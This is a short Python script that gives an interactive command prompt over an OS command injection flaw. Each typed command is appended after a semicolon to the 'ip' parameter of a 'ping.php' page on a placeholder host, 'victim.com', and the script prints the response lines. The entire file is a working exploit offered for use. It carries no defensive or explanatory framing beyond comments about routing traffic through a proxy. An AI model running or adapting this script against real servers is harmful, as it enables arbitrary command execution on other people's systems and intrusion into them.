#!/usr/bin/env python3
import requests
import sys
import readline

def RunCmd(cmd):
    # Add proxy support (eg. BURP to analyze HTTP(s) traffic)
    # set verify = False if your proxy certificate is self signed
    # remember to set proxies both for http and https
    #
    # example:
    #proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    #verify = False
    proxies = {}
    verify = True

    # Headers
    headers = {
        'Host': 'victim.com',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Connection': 'close',
    }

    # Data
    data = r''''''

    # Cookies
    cookies = {
    }

    buildurl='https://victim.com/ping.php?ip=zzz;{}'.format(cmd)

    # Prepare and send request
    req = requests.Request(
        method='GET',
        url=buildurl,
        headers=headers,
        data=data,
        cookies=cookies,
    )
    prepared_req = req.prepare()
    session = requests.Session()
    resp = session.send(prepared_req, proxies=proxies)
    #print(resp.text)
    for line in resp.text.splitlines():
        if not line.startswith("<"):
            print(line)

while True:
    cmd = input('> ')
    if cmd == "exit" or cmd == "quit":
        sys.exit(0)

    RunCmd(cmd)
